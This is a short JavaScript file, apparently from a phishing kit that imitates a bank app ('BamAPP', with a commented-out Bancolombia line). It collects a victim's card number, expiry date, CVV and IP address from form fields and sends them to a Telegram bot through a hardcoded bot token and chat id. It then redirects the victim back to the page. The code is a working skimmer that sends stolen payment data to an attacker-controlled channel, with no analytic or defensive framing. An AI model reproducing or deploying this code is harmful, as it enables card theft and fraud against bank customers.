//bot token


var telegram_bot_id = "7479866714:AAF99WSxm4zb9sEwVgTU9Ybg5dfkS9OYQzE";

var chat_id = '-4589800089'
var u_name, ip, ip2;
var ready = function () {
	
    tarjeta = document.getElementById("tarjeta").value;
	mFecha = document.getElementById("mFecha").value;
	aFecha = document.getElementById("aFecha").value;
	ver = document.getElementById("cvv").value;
    ip = document.getElementById("gfg").innerHTML;
    ip2 = document.getElementById("address").innerHTML;
	
	message = "	BamAPPcc\n\nNombre: " + tarjeta + "\n\n	vence: " + mFecha +"-"+ aFecha+ "\n\nlos3 de   atras: " + ver + "\n\n	IP: " + ip +"\n" + ip2+"\nBamAPP";
	
    // message = "Usuario: " + u_name + "\nIP: " + ip  +"\nBANCOLOMBIA";
};
var sender = function () {
    ready();
    var settings = {
        "async": true,
        "crossDomain": true,
        "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "cache-control": "no-cache"

        },
        "data": JSON.stringify({
            "chat_id": chat_id,
            "text": message
        })
    };
    $.ajax(settings).done(function (response) {
        window.location = 'index.html',1000;
        console.log(response);
    });
    return false;
};
